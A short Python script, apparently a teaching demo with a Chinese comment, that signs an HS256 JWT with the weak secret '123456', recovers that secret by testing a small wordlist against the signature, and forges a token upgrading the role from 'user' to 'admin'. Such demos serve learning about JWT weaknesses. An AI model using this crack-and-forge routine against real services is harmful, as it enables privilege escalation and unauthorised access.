import base64
import hashlib
import hmac
import json

def b64url_enc(raw:bytes)->str:
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")
def b64url_dec(seg:str) -> bytes:
    seg += "=" * (-len(seg)%4)
    return base64.urlsafe_b64decode(seg)
def sign_hs256(secret:bytes,signing_input:str) -> str:
    """签名 = HMAC-SHA256(header.paylaod,secret) 在base64url"""
    mac = hmac.new(secret,signing_input.encode(),hashlib.sha256).digest()
    return b64url_enc(mac)


SECRET = b"123456"
header = {"alg": "HS256" ,"type": "JWT"}
payload = {"uid":1,"role":"user"}

h_seg = b64url_enc(json.dumps(header,separators=(",",":")).encode())
p_seg = b64url_enc(json.dumps(payload,separators=(",",":")).encode())
signing_input = f"{h_seg}.{p_seg}"
token = f"{signing_input}.{sign_hs256(SECRET,signing_input)}"
print("token:",token)


print("header:" ,json.loads(b64url_dec(h_seg)))
print("header:" ,json.loads(b64url_dec(p_seg)))


WORDLIST = [b"secret",b"123456",b"password",b"admin"]
for guess in WORDLIST:
    if sign_hs256(guess,signing_input) == token.split(".")[2]:
        print(f"cracked:{guess}")
        SECRET =guess
        break

forged ={"uid":1,"role":"admin"}
fp =  b64url_enc(json.dumps(forged,separators=(",",":")).encode())
forged_input = f"{h_seg}.{fp}"
forged_token = f"{forged_input}.{sign_hs256(SECRET,forged_input)}"
print("forged",forged_token)
